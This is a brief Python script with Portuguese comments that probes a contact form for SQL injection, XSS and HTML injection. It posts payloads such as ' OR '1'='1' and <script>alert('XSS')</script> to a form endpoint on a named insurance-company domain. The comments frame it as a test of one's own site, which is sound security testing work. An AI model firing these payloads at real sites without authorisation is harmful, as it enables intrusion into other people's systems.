import requests

# URL do formulário (ajuste para o endpoint correto do seu site)
form_url = "https://prefiraseguros.co.ao/contacto/enviar"  # Exemplo fictício

# Campos simulados do formulário (ajuste conforme seu formulário real)
form_fields = {
    "nome": "Teste",
    "email": "injection@test.com",
    "assunto": "Formulário Teste",
    "mensagem": "",  # Vamos testar este campo com injeções
}

# Cargas de teste (payloads maliciosos comuns)
payloads = {
    "sql_injection": "' OR '1'='1'; -- ",
    "xss_script": "<script>alert('XSS')</script>",
    "sql_union": "' UNION SELECT NULL--",
    "html_injection": "<h1>Test</h1>",
    "javascript_href": "<a href='javascript:alert(1)'>Click</a>",
}

print("[*] Iniciando Teste de Injeção no Formulário de Contato...\n")

for label, payload in payloads.items():
    print(f"[*] Testando carga: {label}")
    form_fields["mensagem"] = payload
    try:
        response = requests.post(form_url, data=form_fields, timeout=10)
        print(f"    [✓] Status HTTP: {response.status_code}")
        if payload in response.text:
            print(f"    [⚠️] Possível vulnerabilidade detectada: {label}")
        else:
            print(f"    [✔] Nenhum comportamento anormal identificado.\n")
    except Exception as e:
        print(f"    [✘] Erro ao enviar requisição: {e}\n")

print("\n[✓] Teste finalizado.")
